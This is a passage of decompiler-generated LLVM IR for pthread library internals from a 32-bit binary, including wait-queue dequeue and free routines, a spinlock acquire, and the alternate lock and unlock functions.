  %v1_8057fd6 = phi i32 [ %v0_8057fb5, %dec_label_pc_8057fff.preheader ], [ %v1_8057fd6.pre, %dec_label_pc_8057ffe.dec_label_pc_8057fc1_crit_edge ]
  %v0_8058004.pre25 = phi i32 [ %v0_8058004.pre23, %dec_label_pc_8057fff.preheader ], [ %v0_8058004.pre, %dec_label_pc_8057ffe.dec_label_pc_8057fc1_crit_edge ]
  %v0_8057fcf24 = phi i32 [ 0, %dec_label_pc_8057fff.preheader ], [ %v1_8057ffe, %dec_label_pc_8057ffe.dec_label_pc_8057fc1_crit_edge ]
  %v2_8057fc3 = mul i32 %v0_8058004.pre25, 32
  %v2_8057fc6 = add i32 %v2_8057fc3, %v0_8057fcf24
  %v1_8057fc8 = mul i32 %v2_8057fc6, 8
  %v2_8057fc8 = add i32 %v1_8057fc8, ptrtoint (i32* @global_var_8079604.652 to i32)
  %v3_8057fc8 = inttoptr i32 %v2_8057fc8 to i32*
  %v4_8057fc8 = load i32, i32* %v3_8057fc8, align 4
  %v1_8057fdd = icmp eq i32 %v4_8057fc8, 0
  br i1 %v1_8057fdd, label %dec_label_pc_8057ffe, label %dec_label_pc_8057fe3

dec_label_pc_8057fe3:                             ; preds = %dec_label_pc_8057fc1
  %v3_8057fd6 = mul i32 %v0_8058004.pre25, 4
  %v4_8057fd6 = add i32 %v3_8057fd6, 236
  %v5_8057fd6 = add i32 %v4_8057fd6, %v1_8057fd6
  %v6_8057fd6 = inttoptr i32 %v5_8057fd6 to i32*
  %v7_8057fd6 = load i32, i32* %v6_8057fd6, align 4
  %v1_8057fcf = mul i32 %v0_8057fcf24, 4
  %v8_8057fd6 = add i32 %v7_8057fd6, %v1_8057fcf
  %v1_8057fdf = inttoptr i32 %v8_8057fd6 to i32*
  store i32 0, i32* %v1_8057fdf, align 4
  call void @__pseudo_call(i32 %v4_8057fc8)
  %v0_8057ffe.pre = load i32, i32* @edi, align 4
  %v0_8058004.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057ffe

dec_label_pc_8057ffe:                             ; preds = %dec_label_pc_8057fc1, %dec_label_pc_8057fe3
  %v0_8058004.pre = phi i32 [ %v0_8058004.pre25, %dec_label_pc_8057fc1 ], [ %v0_8058004.pre.pre, %dec_label_pc_8057fe3 ]
  %v0_8057ffe = phi i32 [ %v0_8057fcf24, %dec_label_pc_8057fc1 ], [ %v0_8057ffe.pre, %dec_label_pc_8057fe3 ]
  %v1_8057ffe = add i32 %v0_8057ffe, 1
  store i32 %v1_8057ffe, i32* @edi, align 4
  %v7_8058002 = icmp sgt i32 %v1_8057ffe, 31
  br i1 %v7_8058002, label %dec_label_pc_8058004, label %dec_label_pc_8057ffe.dec_label_pc_8057fc1_crit_edge

dec_label_pc_8057ffe.dec_label_pc_8057fc1_crit_edge: ; preds = %dec_label_pc_8057ffe
  %v1_8057fd6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057fc1

dec_label_pc_8058004:                             ; preds = %dec_label_pc_8057ffe, %dec_label_pc_8057fb3
  %v0_8058004 = phi i32 [ %v0_8058004.pre23, %dec_label_pc_8057fb3 ], [ %v0_8058004.pre, %dec_label_pc_8057ffe ]
  %v1_8058004 = add i32 %v0_8058004, 1
  store i32 %v1_8058004, i32* %ebx.global-to-local, align 4
  %v7_8058008 = icmp sgt i32 %v1_8058004, 31
  br i1 %v7_8058008, label %dec_label_pc_805800a, label %dec_label_pc_8058004.dec_label_pc_8057fb3_crit_edge

dec_label_pc_8058004.dec_label_pc_8057fb3_crit_edge: ; preds = %dec_label_pc_8058004
  %v0_8057fb5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057fb3

dec_label_pc_805800a:                             ; preds = %dec_label_pc_8058004
  %v0_805800a = load i32, i32* @ebp, align 4
  %v1_805800a = add i32 %v0_805800a, 1
  store i32 %v1_805800a, i32* @ebp, align 4
  %v0_8058023.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058023

dec_label_pc_8058017:                             ; preds = %dec_label_pc_8058012
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057fb3

dec_label_pc_8058023:                             ; preds = %dec_label_pc_805800a, %dec_label_pc_8058012
  %v0_8058023 = phi i32 [ %v1_8057fa2, %dec_label_pc_8058012 ], [ %v0_8058023.pre, %dec_label_pc_805800a ]
  %stack_var_-20.0.lcssa = phi i32 [ 1, %dec_label_pc_8058012 ], [ 0, %dec_label_pc_805800a ]
  %v1_8058023 = add i32 %v0_8058023, 28
  %v2_8058023 = inttoptr i32 %v1_8058023 to i32*
  %v3_8058023 = load i32, i32* %v2_8058023, align 4
  store i32 %v3_8058023, i32* @eax, align 4
  store i32 %v0_8058023, i32* @edx, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805802a = call i32 @__pthread_lock(i32 %stack_var_-20.0.lcssa)
  %v0_8058054.pr = load i32, i32* @ebx, align 4
  %v7_805805721 = icmp sgt i32 %v0_8058054.pr, 31
  br i1 %v7_805805721, label %dec_label_pc_8058059, label %dec_label_pc_8058031

dec_label_pc_8058031:                             ; preds = %dec_label_pc_8058023, %dec_label_pc_8058053
  %v1_805803122 = phi i32 [ %v1_8058053, %dec_label_pc_8058053 ], [ %v0_8058054.pr, %dec_label_pc_8058023 ]
  %v0_8058031 = load i32, i32* @esi, align 4
  %v2_8058031 = mul i32 %v1_805803122, 4
  %v3_8058031 = add i32 %v2_8058031, 236
  %v4_8058031 = add i32 %v3_8058031, %v0_8058031
  %v5_8058031 = inttoptr i32 %v4_8058031 to i32*
  %v6_8058031 = load i32, i32* %v5_8058031, align 4
  %v1_8058038 = icmp eq i32 %v6_8058031, 0
  br i1 %v1_8058038, label %dec_label_pc_8058053, label %dec_label_pc_805803c

dec_label_pc_805803c:                             ; preds = %dec_label_pc_8058031
  %v1_8058040 = call i32 @free(i32 %v6_8058031)
  %v0_8058048 = load i32, i32* @esi, align 4
  %v1_8058048 = load i32, i32* @ebx, align 4
  %v2_8058048 = mul i32 %v1_8058048, 4
  %v3_8058048 = add i32 %v0_8058048, 236
  %v4_8058048 = add i32 %v3_8058048, %v2_8058048
  %v5_8058048 = inttoptr i32 %v4_8058048 to i32*
  store i32 0, i32* %v5_8058048, align 4
  %v0_8058053.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058053

dec_label_pc_8058053:                             ; preds = %dec_label_pc_8058031, %dec_label_pc_805803c
  %v0_8058053 = phi i32 [ %v1_805803122, %dec_label_pc_8058031 ], [ %v0_8058053.pre, %dec_label_pc_805803c ]
  %v1_8058053 = add i32 %v0_8058053, 1
  store i32 %v1_8058053, i32* @ebx, align 4
  %v7_8058057 = icmp sgt i32 %v1_8058053, 31
  br i1 %v7_8058057, label %dec_label_pc_8058059, label %dec_label_pc_8058031

dec_label_pc_8058059:                             ; preds = %dec_label_pc_8058053, %dec_label_pc_8058023
  %v0_805805c = load i32, i32* @esi, align 4
  %v1_805805c = add i32 %v0_805805c, 28
  %v2_805805c = inttoptr i32 %v1_805805c to i32*
  %v3_805805c = load i32, i32* %v2_805805c, align 4
  %v1_805805f = inttoptr i32 %v3_805805c to i32*
  %v2_805805f = call i32 @__pthread_unlock(i32* %v1_805805f)
  %v2_8058067 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058067, i32* @ebx, align 4
  store i32 %v0_8057f9d, i32* @esi, align 4
  store i32 %v0_8057f9c, i32* @edi, align 4
  store i32 %v0_8057f99, i32* @ebp, align 4
  ret i32 %v2_805805f

; uselistorder directives
  uselistorder i32 %v1_8058053, { 1, 2, 0 }
  uselistorder i32 %v1_805803122, { 1, 0 }
  uselistorder i32 %v0_8058023, { 1, 0 }
  uselistorder i32 %v1_8058004, { 1, 0, 2 }
  uselistorder i32 %v1_8057ffe, { 0, 2, 1 }
  uselistorder i32 %v0_8057fcf24, { 1, 0, 2 }
  uselistorder i32 %v0_8058004.pre25, { 1, 2, 0 }
  uselistorder i32 %v0_8058004.pre23, { 2, 0, 1 }
  uselistorder i32 %v1_8058012, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8058053, { 1, 0 }
  uselistorder label %dec_label_pc_8058031, { 1, 0 }
  uselistorder label %dec_label_pc_8057ffe, { 1, 0 }
  uselistorder label %dec_label_pc_8057fb3, { 1, 0 }
}

define i32 @wait_node_dequeue() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80581e8 = load i32, i32* @edx, align 4
  %v1_80581e8 = load i32, i32* @eax, align 4
  %v12_80581e8 = icmp eq i32 %v0_80581e8, %v1_80581e8
  %v1_80581ea = icmp eq i1 %v12_80581e8, false
  %v0_8058205.pre = load i32, i32* @ecx, align 4
  br i1 %v1_80581ea, label %dec_label_pc_8058205, label %dec_label_pc_80581ec

dec_label_pc_80581ec:                             ; preds = %entry
  %v1_80581ec = inttoptr i32 %v0_8058205.pre to i32*
  %v2_80581ec = load i32, i32* %v1_80581ec, align 4
  store i32 %v2_80581ec, i32* %ebx.global-to-local, align 4
  %v1_80581f0 = inttoptr i32 %v0_80581e8 to i32*
  %v2_80581f0 = load i32, i32* %v1_80581f0, align 4
  %v15_80581f0 = icmp eq i32 %v0_8058205.pre, %v2_80581f0
  %v22_80581f0 = select i1 %v15_80581f0, i32 %v2_80581ec, i32 %v2_80581f0
  store i32 %v22_80581f0, i32* %v1_80581f0, align 4
  %v1_80581f4 = zext i1 %v15_80581f0 to i32
  %v2_80581f4 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80581f4 = and i32 %v2_80581f4, -256
  %v4_80581f4 = or i32 %v3_80581f4, %v1_80581f4
  store i32 %v4_80581f4, i32* %ebx.global-to-local, align 4
  %v4_80581f7 = icmp eq i1 %v15_80581f0, false
  br i1 %v4_80581f7, label %dec_label_pc_80581ff.preheader, label %dec_label_pc_8058209

dec_label_pc_80581ff.preheader:                   ; preds = %dec_label_pc_80581ec
  %v0_80581ff.pre = load i32, i32* @edx, align 4
  %v0_8058201.pre = load i32, i32* @ecx, align 4
  %v1_80581ff7 = inttoptr i32 %v0_80581ff.pre to i32*
  %v2_80581ff8 = load i32, i32* %v1_80581ff7, align 4
  %v12_805820110 = icmp eq i32 %v0_8058201.pre, %v2_80581ff8
  %v1_805820311 = icmp eq i1 %v12_805820110, false
  br i1 %v1_805820311, label %dec_label_pc_80581fd, label %dec_label_pc_8058205.loopexit

dec_label_pc_80581fd:                             ; preds = %dec_label_pc_80581ff.preheader, %dec_label_pc_80581fd
  %v2_80581ff12 = phi i32 [ %v2_80581ff, %dec_label_pc_80581fd ], [ %v2_80581ff8, %dec_label_pc_80581ff.preheader ]
  %v1_80581ff = inttoptr i32 %v2_80581ff12 to i32*
  %v2_80581ff = load i32, i32* %v1_80581ff, align 4
  %v12_8058201 = icmp eq i32 %v0_8058201.pre, %v2_80581ff
  %v1_8058203 = icmp eq i1 %v12_8058201, false
  br i1 %v1_8058203, label %dec_label_pc_80581fd, label %dec_label_pc_8058205.loopexit

dec_label_pc_8058205.loopexit:                    ; preds = %dec_label_pc_80581fd, %dec_label_pc_80581ff.preheader
  %v0_80581ff.lcssa = phi i32 [ %v0_80581ff.pre, %dec_label_pc_80581ff.preheader ], [ %v2_80581ff12, %dec_label_pc_80581fd ]
  br label %dec_label_pc_8058205

dec_label_pc_8058205:                             ; preds = %entry, %dec_label_pc_8058205.loopexit
  %v1_8058207 = phi i32 [ %v0_80581ff.lcssa, %dec_label_pc_8058205.loopexit ], [ %v0_80581e8, %entry ]
  %v0_8058205 = phi i32 [ %v0_8058201.pre, %dec_label_pc_8058205.loopexit ], [ %v0_8058205.pre, %entry ]
  %v1_8058205 = inttoptr i32 %v0_8058205 to i32*
  %v2_8058205 = load i32, i32* %v1_8058205, align 4
  %v2_8058207 = inttoptr i32 %v1_8058207 to i32*
  store i32 %v2_8058205, i32* %v2_8058207, align 4
  br label %dec_label_pc_8058209

dec_label_pc_8058209:                             ; preds = %dec_label_pc_80581ec, %dec_label_pc_8058205
  %v2_8058209 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_8058209

; uselistorder directives
  uselistorder i32 %v2_80581ff8, { 1, 0 }
  uselistorder i32 %v0_8058201.pre, { 2, 1, 0 }
  uselistorder i1 %v15_80581f0, { 1, 2, 0 }
  uselistorder i32 %v2_80581f0, { 1, 0 }
  uselistorder i32 %v0_8058205.pre, { 1, 0, 2 }
  uselistorder i32 %v0_80581e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8058209, { 1, 0 }
  uselistorder label %dec_label_pc_8058205, { 1, 0 }
  uselistorder label %dec_label_pc_80581fd, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_805820c = load i32, i32* @esi, align 4
  %v0_805820d = load i32, i32* @ebx, align 4
  %v0_805820e = load i32, i32* @eax, align 4
  store i32 %v0_805820e, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_805823a = ptrtoint i32* %stack_var_-16 to i32
  %v1_805824c11 = inttoptr i32 %v0_805820e to i32*
  %v2_805824c12 = load i32, i32* %v1_805824c11, align 4
  store i32 1, i32* %v1_805824c11, align 4
  %v1_805824e13 = icmp eq i32 %v2_805824c12, 0
  %v1_805825015 = icmp eq i1 %v1_805824e13, false
  br i1 %v1_805825015, label %dec_label_pc_8058217, label %dec_label_pc_8058252

dec_label_pc_8058217:                             ; preds = %entry, %dec_label_pc_8058247.backedge
  %v0_8058217 = load i32, i32* @esi, align 4
  %v1_8058217 = add i32 %v0_8058217, -49
  %v6_8058217 = sub i32 48, %v0_8058217
  %v7_8058217 = and i32 %v6_8058217, %v0_8058217
  %v8_8058217 = icmp slt i32 %v7_8058217, 0
  %v9_8058217 = icmp eq i32 %v1_8058217, 0
  %v10_8058217 = icmp slt i32 %v1_8058217, 0
  %v3_805821a = icmp eq i1 %v10_8058217, %v8_8058217
  %v4_805821a = icmp eq i1 %v9_8058217, false
  %v5_805821a = and i1 %v4_805821a, %v3_805821a
  br i1 %v5_805821a, label %dec_label_pc_8058224, label %dec_label_pc_805821c

dec_label_pc_805821c:                             ; preds = %dec_label_pc_8058217
  %v1_805821c = call i32 @sched_yield(i32 %v0_805820d)
  %v0_8058221 = load i32, i32* @esi, align 4
  %v1_8058221 = add i32 %v0_8058221, 1
  store i32 %v1_8058221, i32* @esi, align 4
  br label %dec_label_pc_8058247.backedge

dec_label_pc_8058224:                             ; preds = %dec_label_pc_8058217
  store i32 0, i32* %stack_var_-16, align 4
  store i32 0, i32* @esi, align 4
  %v2_805823f = call i32 @nanosleep(i32 %v2_805823a, i32 0)
  br label %dec_label_pc_8058247.backedge

dec_label_pc_8058247.backedge:                    ; preds = %dec_label_pc_8058224, %dec_label_pc_805821c
  %v0_805824c.pre = load i32, i32* @ebx, align 4
  %v1_805824c = inttoptr i32 %v0_805824c.pre to i32*
  %v2_805824c = load i32, i32* %v1_805824c, align 4
  store i32 1, i32* %v1_805824c, align 4
  %v1_805824e = icmp eq i32 %v2_805824c, 0
  %v1_8058250 = icmp eq i1 %v1_805824e, false
  br i1 %v1_8058250, label %dec_label_pc_8058217, label %dec_label_pc_8058252

dec_label_pc_8058252:                             ; preds = %dec_label_pc_8058247.backedge, %entry
  %v2_805824c.lcssa = phi i32 [ %v2_805824c12, %entry ], [ %v2_805824c, %dec_label_pc_8058247.backedge ]
  store i32 %v0_805820d, i32* @ebx, align 4
  store i32 %v0_805820c, i32* @esi, align 4
  ret i32 %v2_805824c.lcssa

; uselistorder directives
  uselistorder i32 %v1_8058217, { 1, 0 }
  uselistorder label %dec_label_pc_8058217, { 1, 0 }
}

define i32 @wait_node_free() local_unnamed_addr {
entry:
  %v0_8058258 = load i32, i32* @ebx, align 4
  %v0_8058259 = load i32, i32* @eax, align 4
  store i32 %v0_8058259, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_807b61c.654 to i32), i32* @eax, align 4
  %v1_8058263 = call i32 @__pthread_acquire(i32 %v0_8058258)
  %v0_8058268 = load i32, i32* @global_var_807b618.655, align 8
  %v1_805826d = load i32, i32* @ebx, align 4
  %v2_805826d = inttoptr i32 %v1_805826d to i32*
  store i32 %v0_8058268, i32* %v2_805826d, align 4
  %v0_805826f = load i32, i32* @ebx, align 4
  store i32 %v0_805826f, i32* @global_var_807b618.655, align 8
  store i32 0, i32* @global_var_807b61c.654, align 4
  ret i32 %v0_8058268
}

define i32 @restart.7() local_unnamed_addr {
entry:
  %v0_8058286 = load i32, i32* @eax, align 4
  %v1_8058287 = call i32 @__pthread_restart_new(i32 %v0_8058286)
  ret i32 %v1_8058287
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8058290 = load i32, i32* @ebp, align 4
  %v0_8058291 = load i32, i32* @edi, align 4
  %v0_8058292 = load i32, i32* @esi, align 4
  %v0_8058293 = load i32, i32* @ebx, align 4
  store i32 %v0_8058293, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* @esi, align 4
  br label %dec_label_pc_805829b

dec_label_pc_805829b:                             ; preds = %dec_label_pc_805829b.backedge, %entry
  %v24_80582a6 = phi i32 [ %v0_805829b.pre, %dec_label_pc_805829b.backedge ], [ %tmp10, %entry ]
  %v1_805829b = inttoptr i32 %v24_80582a6 to i32*
  %v2_805829b = load i32, i32* %v1_805829b, align 4
  store i32 %v2_805829b, i32* %edx.global-to-local, align 4
  %tmp = or i32 %v2_805829b, 1
  %tmp46 = icmp eq i32 %tmp, 1
  br i1 %tmp46, label %dec_label_pc_80582a2, label %dec_label_pc_80582c9.lr.ph.lr.ph

dec_label_pc_80582a2:                             ; preds = %dec_label_pc_805829b
  store i32 0, i32* @ecx, align 4
  %v2_80582a6 = load i32, i32* %v1_805829b, align 4
  %v15_80582a6 = icmp eq i32 %v2_805829b, %v2_80582a6
  %v22_80582a6 = select i1 %v15_80582a6, i32 0, i32 %v2_80582a6
  store i32 %v22_80582a6, i32* %v1_805829b, align 4
  %v1_80582aa = zext i1 %v15_80582a6 to i32
  %v2_80582aa = load i32, i32* %edx.global-to-local, align 4
  %v3_80582aa = and i32 %v2_80582aa, -256
  %v4_80582aa = or i32 %v3_80582aa, %v1_80582aa
  store i32 %v4_80582aa, i32* %edx.global-to-local, align 4
  %v4_80582ad = icmp eq i1 %v15_80582a6, false
  br i1 %v4_80582ad, label %dec_label_pc_805829b.backedge, label %dec_label_pc_8058336.loopexit

dec_label_pc_805829b.backedge:                    ; preds = %dec_label_pc_80582a2, %dec_label_pc_8058308, %dec_label_pc_8058312
  %v0_805829b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805829b

dec_label_pc_80582c9.lr.ph.lr.ph:                 ; preds = %dec_label_pc_805829b
  store i32 %v2_805829b, i32* @ebx, align 4
  store i32 %v24_80582a6, i32* @ebp, align 4
  store i32 %v2_805829b, i32* @edi, align 4
  store i32 %v24_80582a6, i32* %stack_var_-28, align 4
  br label %dec_label_pc_80582c9.lr.ph

dec_label_pc_80582c9:                             ; preds = %dec_label_pc_80582c9.lr.ph, %dec_label_pc_80582cf
  %v0_80582ff27 = phi i32 [ %v0_8058303337, %dec_label_pc_80582c9.lr.ph ], [ %v2_80582e3, %dec_label_pc_80582cf ]
  %v0_80582fc26 = phi i32 [ %v0_80582d1536, %dec_label_pc_80582c9.lr.ph ], [ %v0_80582e1, %dec_label_pc_80582cf ]
  %v0_80582d325 = phi i32 [ %v0_80582d3635, %dec_label_pc_80582c9.lr.ph ], [ %v1_80582e1, %dec_label_pc_80582cf ]
  %v1_80582c9 = add i32 %v0_80582ff27, 8
  %v2_80582c9 = inttoptr i32 %v1_80582c9 to i32*
  %v3_80582c9 = load i32, i32* %v2_80582c9, align 4
  %v4_80582c9 = icmp eq i32 %v3_80582c9, 0
  br i1 %v4_80582c9, label %dec_label_pc_80582ea, label %dec_label_pc_80582cf

dec_label_pc_80582cf:                             ; preds = %dec_label_pc_80582c9
  store i32 %v0_80582ff27, i32* @ecx, align 4
  store i32 %v0_80582fc26, i32* @edx, align 4
  store i32 %v0_80582d325, i32* @eax, align 4
  %v0_80582d5 = call i32 @wait_node_dequeue()
  %v0_80582da = load i32, i32* @ebx, align 4
  store i32 %v0_80582da, i32* @eax, align 4
  %v0_80582dc = call i32 @wait_node_free()
  %v0_80582e1 = load i32, i32* @ebp, align 4
  %v1_80582e1 = load i32, i32* @esi, align 4
  %v1_80582e3 = inttoptr i32 %v0_80582e1 to i32*
  %v2_80582e3 = load i32, i32* %v1_80582e3, align 4
  store i32 %v2_80582e3, i32* @ebx, align 4
  %v9_8058303 = icmp eq i32 %v2_80582e3, 1
  %v1_8058306 = icmp eq i1 %v9_8058303, false
  br i1 %v1_8058306, label %dec_label_pc_80582c9, label %dec_label_pc_8058308

dec_label_pc_80582ea:                             ; preds = %dec_label_pc_80582c9
  %v1_80582ea = add i32 %v0_80582ff27, 4
  %v2_80582ea = inttoptr i32 %v1_80582ea to i32*
  %v3_80582ea = load i32, i32* %v2_80582ea, align 4
  %v1_80582ed = add i32 %v3_80582ea, 24
  %v2_80582ed = inttoptr i32 %v1_80582ed to i32*
  %v3_80582ed = load i32, i32* %v2_80582ed, align 4
  %v5_80582f4 = icmp slt i32 %v3_80582ed, %stack_var_-24.1.ph38
  br i1 %v5_80582f4, label %dec_label_pc_80582ff, label %dec_label_pc_80582f6

dec_label_pc_80582f6:                             ; preds = %dec_label_pc_80582ea
  store i32 %v0_80582ff27, i32* @edi, align 4
  store i32 %v0_80582fc26, i32* %stack_var_-28, align 4
  br label %dec_label_pc_80582ff

dec_label_pc_80582ff:                             ; preds = %dec_label_pc_80582ea, %dec_label_pc_80582f6
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1.ph38, %dec_label_pc_80582ea ], [ %v3_80582ed, %dec_label_pc_80582f6 ]
  store i32 %v0_80582ff27, i32* @ebp, align 4
  %v1_8058301 = inttoptr i32 %v0_80582ff27 to i32*
  %v2_8058301 = load i32, i32* %v1_8058301, align 4
  store i32 %v2_8058301, i32* @ebx, align 4
  %v9_805830322 = icmp eq i32 %v2_8058301, 1
  %v1_805830624 = icmp eq i1 %v9_805830322, false
  br i1 %v1_805830624, label %dec_label_pc_80582c9.lr.ph, label %dec_label_pc_8058308

dec_label_pc_80582c9.lr.ph:                       ; preds = %dec_label_pc_80582c9.lr.ph.lr.ph, %dec_label_pc_80582ff
  %stack_var_-24.1.ph38 = phi i32 [ -2147483648, %dec_label_pc_80582c9.lr.ph.lr.ph ], [ %stack_var_-24.0, %dec_label_pc_80582ff ]
  %v0_8058303337 = phi i32 [ %v2_805829b, %dec_label_pc_80582c9.lr.ph.lr.ph ], [ %v2_8058301, %dec_label_pc_80582ff ]
  %v0_80582d1536 = phi i32 [ %v24_80582a6, %dec_label_pc_80582c9.lr.ph.lr.ph ], [ %v0_80582ff27, %dec_label_pc_80582ff ]
  %v0_80582d3635 = phi i32 [ %v24_80582a6, %dec_label_pc_80582c9.lr.ph.lr.ph ], [ %v0_80582d325, %dec_label_pc_80582ff ]
  br label %dec_label_pc_80582c9

dec_label_pc_8058308:                             ; preds = %dec_label_pc_80582cf, %dec_label_pc_80582ff
  %stack_var_-24.1.ph.lcssa = phi i32 [ %stack_var_-24.0, %dec_label_pc_80582ff ], [ %stack_var_-24.1.ph38, %dec_label_pc_80582cf ]
  %v0_80582ff.lcssa = phi i32 [ %v2_8058301, %dec_label_pc_80582ff ], [ %v2_80582e3, %dec_label_pc_80582cf ]
  %v8_8058308 = icmp eq i32 %stack_var_-24.1.ph.lcssa, -2147483648
  br i1 %v8_8058308, label %dec_label_pc_805829b.backedge, label %dec_label_pc_8058312

dec_label_pc_8058312:                             ; preds = %dec_label_pc_8058308
  %v0_8058314 = load i32, i32* @edi, align 4
  %v1_8058314 = add i32 %v0_8058314, 8
  %v2_8058314 = inttoptr i32 %v1_8058314 to i32*
  %v3_8058314 = load i32, i32* %v2_8058314, align 4
  store i32 %v0_80582ff.lcssa, i32* %v2_8058314, align 4
  %v1_8058317 = icmp eq i32 %v3_8058314, 0
  %v1_8058319 = icmp eq i1 %v1_8058317, false
  br i1 %v1_8058319, label %dec_label_pc_805829b.backedge, label %dec_label_pc_805831b

dec_label_pc_805831b:                             ; preds = %dec_label_pc_8058312
  %v2_805831b = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_805831b, i32* @edx, align 4
  %v0_805831e = load i32, i32* @esi, align 4
  store i32 %v0_805831e, i32* @eax, align 4
  %v0_8058320 = load i32, i32* @edi, align 4
  store i32 %v0_8058320, i32* @ecx, align 4
  %v0_8058322 = call i32 @wait_node_dequeue()
  %v0_8058327 = load i32, i32* @edi, align 4
  %v1_8058327 = add i32 %v0_8058327, 4
  %v2_8058327 = inttoptr i32 %v1_8058327 to i32*
  %v3_8058327 = load i32, i32* %v2_8058327, align 4
  store i32 %v3_8058327, i32* @eax, align 4
  %v2_805832d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805832d, i32* @ebx, align 4
  %v0_8058331 = call i32 @restart.7()
  br label %dec_label_pc_8058336

dec_label_pc_8058336.loopexit:                    ; preds = %dec_label_pc_80582a2
  br label %dec_label_pc_8058336

dec_label_pc_8058336:                             ; preds = %dec_label_pc_8058336.loopexit, %dec_label_pc_805831b
  %v0_805833d = phi i32 [ %v2_805829b, %dec_label_pc_8058336.loopexit ], [ %v0_8058331, %dec_label_pc_805831b ]
  store i32 %v0_8058292, i32* @esi, align 4
  store i32 %v0_8058291, i32* @edi, align 4
  store i32 %v0_8058290, i32* @ebp, align 4
  ret i32 %v0_805833d

; uselistorder directives
  uselistorder i32 %stack_var_-24.1.ph38, { 0, 2, 1 }
  uselistorder i32 %v2_8058301, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80582e3, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80582e1, { 1, 0 }
  uselistorder i32 %v0_80582ff27, { 4, 1, 0, 2, 3, 6, 5 }
  uselistorder i1 %v15_80582a6, { 1, 2, 0 }
  uselistorder i32 %v2_80582a6, { 1, 0 }
  uselistorder i32 %v2_805829b, { 1, 2, 5, 4, 3, 0, 6 }
  uselistorder i32 %v24_80582a6, { 1, 0, 3, 2, 4 }
  uselistorder i32 ()* @wait_node_dequeue, { 1, 0 }
  uselistorder label %dec_label_pc_8058308, { 1, 0 }
  uselistorder label %dec_label_pc_80582c9.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80582ff, { 1, 0 }
  uselistorder label %dec_label_pc_805829b.backedge, { 2, 1, 0 }
}

define i32 @thread_self.8() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_805833e = load i32, i32* @esp, align 4
  %v1_805833e = load i32, i32* @global_var_807b620.613, align 32
  %v7_805833e = icmp ult i32 %v0_805833e, %v1_805833e
  %v1_805834b = icmp eq i1 %v7_805833e, false
  br i1 %v1_805834b, label %dec_label_pc_805837c, label %dec_label_pc_805834d

dec_label_pc_805834d:                             ; preds = %entry
  %v1_805834d = load i32, i32* @global_var_807b624.614, align 4
  %v7_805834d = icmp ult i32 %v0_805833e, %v1_805834d
  br i1 %v7_805834d, label %dec_label_pc_8058362, label %dec_label_pc_8058355

dec_label_pc_8058355:                             ; preds = %dec_label_pc_805834d
  %v1_8058355 = load i32, i32* @global_var_807b628.615, align 8
  %v7_8058355 = icmp ult i32 %v0_805833e, %v1_8058355
  br i1 %v7_8058355, label %dec_label_pc_805837c, label %dec_label_pc_8058362

dec_label_pc_8058362:                             ; preds = %dec_label_pc_8058355, %dec_label_pc_805834d
  %v0_8058362 = load i32, i32* @global_var_807f100.617, align 256
  %v1_8058362 = icmp eq i32 %v0_8058362, 0
  br i1 %v1_8058362, label %dec_label_pc_8058370, label %dec_label_pc_805836b

dec_label_pc_805836b:                             ; preds = %dec_label_pc_8058362
  %v0_805836b = call i32 @__pthread_find_self()
  br label %dec_label_pc_8058370

dec_label_pc_8058370:                             ; preds = %dec_label_pc_8058362, %dec_label_pc_805836b
  %v2_8058376 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805837c

dec_label_pc_805837c:                             ; preds = %dec_label_pc_8058355, %entry, %dec_label_pc_8058370
  %v0_805837c = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_8058355 ], [ ptrtoint (i32* @global_var_80748c0 to i32), %entry ], [ %v2_8058376, %dec_label_pc_8058370 ]
  ret i32 %v0_805837c

; uselistorder directives
  uselistorder label %dec_label_pc_805837c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058370, { 1, 0 }
}

define i32 @suspend.9(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8058380 = load i32, i32* @eax, align 4
  %v1_8058381 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8058380)
  ret i32 %v1_8058381
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805838a = load i32, i32* @esi, align 4
  %v0_805838b = load i32, i32* @ebx, align 4
  store i32 %v0_805838b, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* @esi, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
